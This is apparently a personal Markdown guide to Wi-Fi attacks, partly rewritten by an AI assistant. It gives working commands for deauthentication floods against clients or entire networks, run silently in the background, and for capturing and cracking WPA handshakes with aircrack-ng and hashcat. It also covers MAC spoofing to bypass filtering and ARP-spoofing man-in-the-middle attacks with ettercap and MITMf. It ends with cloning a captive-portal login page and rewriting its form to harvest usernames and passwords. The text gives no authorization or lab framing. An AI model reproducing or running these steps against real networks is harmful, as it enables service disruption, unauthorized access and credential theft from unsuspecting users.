## Step1. 
- connect WiFi-Adapter
- use `iwconfig` and check it's connected or not.

## Step2.

### 1. Start monitor mode
```bash
airmon-ng start wlan0
```

### 2. Discover networks
```bash
airodump-ng wlan0
```

If you want to scan both 2.4 GHz and 5 GHz:

   ```bash
   airodump-ng --band ab wlan0mon
   ```

### 3. Target the right BSSID/CH
```bash
airodump-ng -c [channel] --bssid [target BSSID] -w capture wlan0
```

### 4. Force a client to reconnect (capture handshake)
```bash
aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0
```
- 10000 is the number of deauth packets
- working : it's send packets like i want to disconnect form this wifi. and here mac address is client address

### If you want to do it in the background
```
 aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0 &> /dev/null & 
```
- &> /dev/null use to hide the output
- Lat & for run multiple commands
- Use jobs to see commands running in the background.
- Use the kill command to stop a specific command.Like `kill %1` OR for all `killall aireplay-ng`


### 5. Crack the handshake
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap
```

### 6. Crack the hashes.
---
#### 🔁 Step 1: Convert `.cap` to `.hc22000`

Use `hcxpcapngtool` to convert your `.cap` or `.hccapx` to `.hc22000`:

```bash
hcxpcapngtool -o file_name.hc22000 file_name.cap
```

### 🚀 Step 2: Crack with Hashcat in Correct Mode

```bash
hashcat -m 22000 file_name.hc22000 /path/to/wifi/password/wordlist
```

* `-m 22000`: The correct WPA2/WPA3 handshake mode.
* `file_name.hc22000`: Your converted handshake.
* Wordlist path: That big juicy file you’ve got.


### 🧠 Harpy Pro Tip:

Wanna see **live cracking stats**?
Add:

```bash
--status --status-timer=10
```

To pause/resume:

* Press `p` to pause
* Press `r` to resume

---

### ✅ Example Full Command:

```bash
hashcat -m 22000 handshake.hc22000 /path/to/wifi/password/wordlist --status --status-timer=10
```

## Preconnection Attacks
- More advanced pre-connection attacks
- manually change MAC address on any supported divice.
- Target 5Ghz Networks and clients.
- Deauthenticate multiple clients simultaneously.
- Run deauth attack against multiple networks simultaneously.

### MAC spoofing

commands:
```bash
ifconfig wlan0 down 
macchanger -r wlan0 # auto change mac address
#or
ifconfig wlan0 hw ether 00:11:22:33:44:55 # manully change mac address
ifconfig wlan0 up
```
- `macchanger -r wlan0`:- auto change mac address
- `ifconfig wlan0 hw ether 00:11:22:33:44:55` :- manully change mac address

### Wifi Bands
- Decides the frequency range that can be used.
- Determines the channels that can be used.
- Clients need to support band used by router to communicate with it.
- Data can be sniffed from a certain band if the wireless adapter used
supports that band.
- Most common WiFi Bands are:
    - a uses 5 Ghz frequency only.
    - b, g both use 2.4 Ghz frequency only.
    - n uses 5 and 2.4 Ghz.
    - ac uses frequencies lower than 6 Ghz

The command:
```bash
airodump-ng --band a wlan0
```

### 🔍 What it does:

* **`airodump-ng`**: A tool used to capture raw 802.11 wireless frames. It’s part of the Aircrack-ng suite.
* **`--band a`**: This tells `airodump-ng` to scan **only the 5 GHz band** (802.11a).
* **`wlan0`**: This is your wireless interface. It must be in **monitor mode** (e.g., `wlan0mon` on most systems).
* Scan for **5 GHz networks** only (ignores 2.4 GHz).
* Identify **access points (APs)**, clients, BSSIDs, channels, etc. operating in the 5 GHz band.

---

### 🧠 Important Notes:

1. Your Wi-Fi card **must support 5 GHz** to use `--band a`.
2. Your interface **must be in monitor mode**:

   ```bash
   airmon-ng start wlan0
   # Then use wlan0mon (or check with `iwconfig`)
   ```
3. If you want to scan both 2.4 GHz and 5 GHz:

   ```bash
   airodump-ng --band ab wlan0mon
   ```

---
## 🔍 Step 3: Target the Correct BSSID and Channel

Use `airodump-ng` to lock in on a specific wireless network and begin packet capture:

```bash
airodump-ng -c [channel] --bssid [target BSSID] -w capture wlan0
```

* `-c [channel]` – Specifies the Wi-Fi channel to listen on.
* `--bssid [target BSSID]` – Targets a specific access point (AP).
* `-w capture` – Saves the captured packets to a file (`capture.cap`).
* `wlan0` – Replace with your wireless interface in monitor mode.

---

## ⚔️ Step 4: Capture the Handshake via Client Deauthentication

Trigger deauthentication packets to force a client to reconnect, thereby capturing the WPA/WPA2 handshake:

```bash
aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0
```

* `--deauth 10000` – Sends 10,000 deauth packets.
* `-a [router BSSID]` – Specifies the AP’s MAC address.
* `-c [client MAC]` – Targets the client (station) MAC address.
* `wlan0` – Again, replace with your actual wireless interface.

🧠 *This simulates disconnection requests, tricking the client into reconnecting, which exposes the handshake.*

---

## ⚔️ Disconnect All Devices from a Targeted Router

### Basic deauth for all clients:

```bash
aireplay-ng --deauth 10000 -a [router BSSID] wlan0
```

* `--deauth 10000` – Number of deauth packets (adjust as needed).
* `-a [router BSSID]` – Targets the access point.
* No `-c` flag = affects **all connected clients**.
* `wlan0` – Your monitor-mode interface.

---

## 👻 Run Deauth in Background (Silent Mode)

To run the attack silently and in the background:

```bash
aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0 &> /dev/null &
```

* `&> /dev/null` – Suppresses all output (stdout and stderr).
* `&` – Runs the command in the background.

![alt text](images/multi%20commands.png)

### 🔍 Monitor Background Jobs

To view running background tasks:

```bash
jobs
```

### ❌ Kill Background Processes

To stop a specific background job:

```bash
kill %1
```

To terminate all running `aireplay-ng` processes:

```bash
killall aireplay-ng
```

---

🦅 *Stay sharp: Monitor your capture file to ensure the handshake is obtained. Use `aircrack-ng -r` or `wireshark` for verification.*

## Gaining Access
- target hidden networks
- Bypass mac filtering
- method to gain access to
- Advanced method to gain access to
    - Captive portals.
    - WEP.
    - WPA
    - wpA2.
    - WPA/WPA2 Enterprise.
- Manually create fake AP.

### Hidden networks
- A hidden network is one that does not broadcast its name or ESSID.
-  Hidden networks still broadcasts their existance (channel, BSSID).

#### Problem:
- Can’t connect or even attempt to crack its password.
#### Solutions:
- Airodump-ng can determine the ESSID if the network is active.
- Deauth one of the connected clients for a short period of time.
![alt text](images/Hidden%20network1.png)
![alt text](images/Hidden%20network2.png)
![alt text](images/Hidden%20network3.png)

---

### 🛠️ Objective:

**Reveal the SSID of a hidden Wi-Fi network** by forcing a connected client to disconnect (deauth attack), and then capturing the handshake or beacon when it reconnects.

---

###  Explanation:

To identify the name (SSID) of a hidden Wi-Fi network:

1. Use `airodump-ng` to find the **BSSID** of the hidden network and any **connected clients**.
2. Use `aireplay-ng` to send **deauthentication packets** to disconnect a client from that network.
3. When the client **reconnects**, it sends a probe request or association request **revealing the SSID**, which you can capture with `airodump-ng`.

---

### ✅ Command:

```bash
aireplay-ng --deauth 4 -a [Router_BSSID] -c [Client_MAC] wlan0
```

* `--deauth 4`: sends 4 deauth packets (you can increase it if needed).
* `-a [Router_BSSID]`: the MAC address of the hidden Wi-Fi router (AP).
* `-c [Client_MAC]`: the MAC address of a client connected to the hidden Wi-Fi.
* `wlan0`: your wireless interface in monitor mode.

---

### 🧠 Full Flow Example:

```bash
# Step 1: Scan and find hidden AP and client
airodump-ng wlan0mon

# Step 2: Deauth the client
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 3: Capture packets and reveal SSID when client reconnects
airodump-ng -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

Once the client reconnects, the hidden SSID will appear in `airodump-ng`, or can be extracted from the capture file using `Wireshark`.

---

### Mac Filtering
- Mac address is unique to each network device.
- Routers can use mac filtering to allow/deny devices from connecting based on their mac address.

#### 2 Implementations:
1. Using a blacklist - allow all MACs to connect except the ones in the list.
   - Ans:- Just change the MAC address.
2. Using a whitelist - deny all MACs from connecting except the ones in the list.
   - Ans:- Just change the MAC address to connected device MAC address.


## Bypassing Captive Portals

Captive portals can be bypassed using various methods depending on how they are implemented:

1. Change your MAC address to match that of a connected client.
2. Use monitor mode to sniff login credentials.
3. Connect to the network and execute an ARP spoofing attack to capture credentials.
4. Create a fake access point (AP) and trick users into logging in.

---

### Sniffing Credentials in Monitor Mode

* Captive portals are typically open networks.
* This means they do **not** use encryption (e.g., WPA/WPA2).
* Use `airodump-ng` to capture traffic in monitor mode.
* Then analyze the captured packets using **Wireshark** to extract credentials such as usernames and passwords.

---

### Sniffing Credentials Using ARP Spoofing

* Open networks allow connection without a password.
* After connecting, a typical ARP spoofing attack can be performed.

Expected behavior:

* Connected clients may lose their session and be prompted to log in again.
* All data transmitted between clients and the router (including credentials) can be intercepted.

Commands:

``` bash
sudo ettercap -Tq -M arp:remote -i wlan0 ///
```
Each target is placed between two slashes: <br>
/TARGET1/ /TARGET2/ — intercept traffic between TARGET1 and TARGET2. <br>
/// — intercept all traffic on the network (no specific targets).

/// it  means:

- No specific targets.
- ARP poison the entire subnet.
- Perform a full man-in-the-middle attack on all devices on the LAN.

Or:
``` bash
mitmf --arp --spoof -i wlan0 --gateway [gateway]

# For finding gateway: route -n
```

---

## Difference Between MITMf and Ettercap

Man-in-the-middle (MitM) attacks are a foundational part of network exploitation. Two popular tools used in this domain are **Ettercap** and **MITMf (Man-in-the-Middle Framework)**. Here is a breakdown of how they work and their differences.

---

### 1. Ettercap – The Classic Toolkit

"Swiss Army knife of MitM attacks in local networks"

#### How It Works:

* Performs ARP poisoning by sending forged ARP replies.
* Captures traffic between victim and gateway.
* Supports protocol dissection (e.g., FTP, HTTP, Telnet).
* Can inject scripts into HTTP traffic.
* Supports writing filters for modifying traffic in real time.

#### Capabilities:

* ARP poisoning (IPv4)
* DNS spoofing
* Password sniffing
* HTTP injection
* Plugin support

#### Limitations:

* Lacks support for IPv6.
* Poor compatibility with modern encrypted protocols (HTTPS, HSTS).
* Some features are unstable on modern systems.

---

### 2. MITMf – A Modern, Modular Framework

Modular, Python-based, and designed for modern attack surfaces.

#### How It Works:

* Built with a modular architecture using Python.
* Integrates tools and libraries like Scapy, Responder, SSLStrip2, and BeEF.
* Focuses on extensibility and flexibility.

#### Flexible Attack Vectors:

* ARP and NDP poisoning
* DNS spoofing
* SMB/NTLM capture
* SSLStrip2 for HTTPS downgrade
* HTML and JavaScript injection
* BeEF hook injection

#### Modular Usage:

* `--arp` for ARP poisoning
* `--spoof` for DNS spoofing
* `--inject` for content injection
* `--credentials` for credential capture

#### Advanced Capabilities:

* Uses tools like **Responder** and **NTLM-relay** to extract credentials or perform privilege escalation.
* Supports SSLStrip2 and HSTS bypass when used with DNS spoofing.

---

## Ettercap vs MITMf – Feature Comparison

| Feature              | Ettercap       | MITMf                       |
| -------------------- | -------------- | --------------------------- |
| Language             | C              | Python                      |
| ARP Poisoning        | Yes            | Yes                         |
| SSLStrip/HSTS Bypass | Limited        | Full (via plugins)          |
| Plugin System        | Yes (legacy)   | Yes (modular, extensible)   |
| BeEF Integration     | No             | Yes                         |
| IPv6 Support         | No             | Yes                         |
| Maintenance          | Rarely updated | Archived (but still useful) |

---

## Final Thoughts

* **Ettercap** is suitable for simple local attacks on legacy protocols and unencrypted traffic.
* **MITMf** is a more powerful option, designed for complex environments and supports a wider range of modern exploitation techniques.

---

## Using Social Engineering Techniques

- When everything fails we target the users.
- Clone the login page used by the captive portal.
- Create a fake AP with the same/similar name.
- Deauth users to use the fake network with the cloned page.
- Sniff the login info!


### Cloning the login page

1. First, navigate to the **login page** of the target captive portal.

2. Press **Ctrl + S** to **save the entire page** (including HTML, CSS, and JavaScript files).

   * Make sure to save it as **"Web Page, Complete"** to include all assets.

3. Move the saved files into the Apache web root directory:

   ```bash
   sudo mv /path/to/saved/page/* /var/www/html/
   ```

4. Rename the main HTML file to `index.html`:

   ```bash
   sudo mv /var/www/html/[original_page].html /var/www/html/index.html
   ```

   * Apache serves `index.html` by default as the landing page.

5. Start the Apache server:

   ```bash
   sudo service apache2 start
   ```

6. Open a browser and visit:

   ```
   http://127.0.0.1
   ```

   * Confirm the cloned login page is loading properly.

---


next steps: modify html code

if href=asset/image so modify it to href=/asset/image 
2. 
if your usernameand password not rape with form tag than add form tag menualy cause using form tag it's easy to get username and password. and also check sumbit button

Here's the next section written properly and professionally sequenced, continuing from the previous steps:

---

## Modifying the HTML Code

Once you've saved and moved the captive portal login page into `/var/www/html`, and renamed the main file as `index.html`, you'll need to **edit the HTML** to ensure it works correctly when served locally and can capture user credentials effectively.

### 1. Fix Relative Paths

* In many saved HTML pages, paths to images, stylesheets, or scripts may be written as:

  ```html
  href="asset/image"
  ```

* These will **not resolve correctly** unless they're changed to reference the correct root-relative path.

* **Modify them like this:**

  ```html
  href="/asset/image"
  ```

* This applies to:

  * `<link href=...>` for stylesheets
  * `<script src=...>` for JavaScript
  * `<img src=...>` for images

### 2. Ensure Username and Password Fields Are Inside a `<form>` Tag

* Often, login forms may contain username and password fields (`<input type="text">`, `<input type="password">`) **without being wrapped in a `<form>` tag**, especially in JavaScript-heavy or AJAX-based login pages.

* To capture credentials effectively (e.g., using a PHP script or MITM framework), it's important to wrap these fields inside a standard HTML `<form>` element.

* **Example of a corrected structure:**

  ```html
  <form action="capture.php" method="POST">
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Login</button>
  </form>
  ```

* This allows the credentials to be easily submitted to your server-side script for logging or redirection.

### 3. Check the Submit Button

* Make sure the **submit button** inside the form is properly defined:

  ```html
  <button type="submit">Login</button>
  ```

  Or:

  ```html
  <input type="submit" value="Login">
  ```

* If it's just a `<div>` or `<a>` element styled to look like a button, it won't submit the form unless JavaScript is present. Replace or modify it accordingly.
